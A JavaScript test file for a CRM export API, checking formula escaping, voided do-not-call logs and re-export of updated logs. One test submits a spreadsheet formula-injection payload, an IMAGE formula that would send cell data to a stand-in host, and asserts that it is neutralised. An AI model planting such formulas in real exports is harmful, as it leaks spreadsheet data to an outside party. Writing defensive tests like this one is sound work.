// What GET export hands the CRM bridge: text people typed reaches a sheet as text, never as a formula; a voided log
// sends nothing; a change made after a log was exported is exported again; a business added in the app gets its stage.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { start, logBody } from './team-helper.mjs';

const API = '/equipo/api';
const B = { bearer: 'push-token' };
const exportSince = async (s, since = '2026-11-01T00:00:00Z') => (await s.call('GET', `${API}/export?since=${encodeURIComponent(since)}`, undefined, B)).json;

test('export: text a person typed that a sheet would read as a formula starts with an apostrophe; ids and plain text stay as they are', async (t) => {
  const s = await start(); t.after(() => s.srv.close());
  const a = await s.admin();
  const m = await s.addRep(a.cookie, 'mario', { name: '@Mario Rep', city: '+Ciudad' });
  const C = { cookie: m.cookie };
  const evil = await s.call('POST', `${API}/log`, logBody('formula-0001', { kind: 'meeting', channel: 'visit', when: '2026-11-18', contact: '-Sr. X', note: '=IMAGE("https://x.example/?d="&A1)',
    lead: { name: '=1+1', zone: '@Centro' } }), C);
  assert.equal(evil.status, 200, evil.text);
  const plain = await s.call('POST', `${API}/log`, logBody('formula-0002', { lead: { name: 'Ferretería El Roble', zone: 'Vía España' }, note: 'Volver el martes' }), C);
  assert.equal(plain.status, 200, plain.text);
  const ex = await exportSince(s);
  const [one, two] = ex.logs;
  assert.deepEqual([one.lead.name, one.lead.zone, one.owner, one.contact, one.note], ["'=1+1", "'@Centro", "'@Mario Rep", "'-Sr. X", '\'=IMAGE("https://x.example/?d="&A1)']);
  assert.match(one.lead.id, /^APP-[0-9A-F]{8}$/);
  assert.deepEqual([one.id, one.day, one.when, one.handle], ['formula-0001', '2026-11-16', '2026-11-18', 'mario']);
  assert.deepEqual([two.lead.name, two.lead.zone, two.note], ['Ferretería El Roble', 'Vía España', 'Volver el martes']);
  const fresh = ex.newLeads.find((l) => l.id === one.lead.id);
  assert.deepEqual([fresh.company, fresh.zone, fresh.city], ["'=1+1", "'@Centro", "'+Ciudad"]);
  assert.equal(ex.newLeads.find((l) => l.id === two.lead.id).company, 'Ferretería El Roble');
  // the app itself keeps what was typed
  assert.equal(s.lines().find((e) => e.id === 'formula-0001').lead.name, '=1+1');
});

test('export: a do-not-call log a manager voided is not sent as do not call, nor as a log or a stage', async (t) => {
  const s = await start(); t.after(() => s.srv.close());
  const a = await s.admin(), m = await s.addRep(a.cookie, 'mario');
  await s.call('PUT', `${API}/leads`, [{ id: 'PA-0001', company: 'Farmacia Uno', city: 'Panama City', zone: 'Centro', stage: 'New' },
    { id: 'PA-0002', company: 'Farmacia Dos', city: 'Panama City', zone: 'Centro', stage: 'New' }], B);
  const log = (id, lead) => s.call('POST', `${API}/log`, logBody(id, { kind: 'call', tag: 'do_not_call', lead: { id: lead } }), { cookie: m.cookie });
  assert.equal((await log('dnc-log-0001', 'PA-0001')).status, 200);
  assert.equal((await log('dnc-log-0002', 'PA-0002')).status, 200);
  assert.equal((await s.call('POST', `${API}/void`, { logId: 'dnc-log-0001', reason: 'wrong business' }, { cookie: a.cookie })).status, 200);
  const ex = await exportSince(s);
  assert.deepEqual(ex.doNotCall, ['PA-0002']);
  assert.deepEqual(ex.logs.map((l) => l.id), ['dnc-log-0002']);
  assert.deepEqual(ex.stages, [{ lead: 'PA-0002', stage: 'Contacted' }]);
});

test('export: a log completed after it was exported goes out again, once, with what was added; a restart keeps that', async (t) => {
  const s = await start({ clock: Date.parse('2026-11-16T14:00:00Z') }); t.after(() => s.srv.close());   // Monday 09:00 in Panama
  const a = await s.admin(), m = await s.addRep(a.cookie, 'mario');
  await s.call('PUT', `${API}/leads`, [{ id: 'PA-0001', company: 'Farmacia Uno', city: 'Panama City', zone: 'Centro', stage: 'New' }], B);
  const call = (id, over = {}) => s.call('POST', `${API}/log`, logBody(id, { kind: 'call', lead: { id: 'PA-0001' }, clientAt: new Date(s.time.now).toISOString(), ...over }), { cookie: m.cookie });
  assert.equal((await call('call-0900-0001')).status, 200);
  s.time.now = Date.parse('2026-11-16T15:00:00Z');   // 10:00: the bridge's hourly run
  const first = await exportSince(s, '2026-11-16T00:00:00Z');
  assert.deepEqual([first.logs.map((l) => l.id), first.doNotCall], [['call-0900-0001'], []]);
  s.time.now = Date.parse('2026-11-16T19:00:00Z');   // 14:00: the owner asks not to be called again; same business, same result
  const again = await call('call-1400-0001', { tag: 'do_not_call', note: 'No volver a llamar' });
  assert.deepEqual([again.json.repeat, again.json.updated, again.json.logId], [true, true, 'call-0900-0001']);
  s.time.now = Date.parse('2026-11-16T20:00:00Z');   // 15:00: the next run
  const next = await exportSince(s, first.until);
  assert.deepEqual(next.logs.map((l) => [l.id, l.tag, l.note, l.day]), [['call-0900-0001', 'do_not_call', 'No volver a llamar', '2026-11-16']]);
  assert.deepEqual(next.doNotCall, ['PA-0001']);
  assert.equal((await exportSince(s, '2026-11-16T00:00:00Z')).logs.length, 1, 'each log once per export');
  assert.equal((await exportSince(s, next.until)).logs.length, 0, 'and nothing again once that run is done');
  s.srv.close();
  const back = await start({ dir: s.dir, clock: s.time.now }); t.after(() => back.srv.close());
  assert.deepEqual((await exportSince(back, first.until)).logs.map((l) => l.id), ['call-0900-0001']);
});
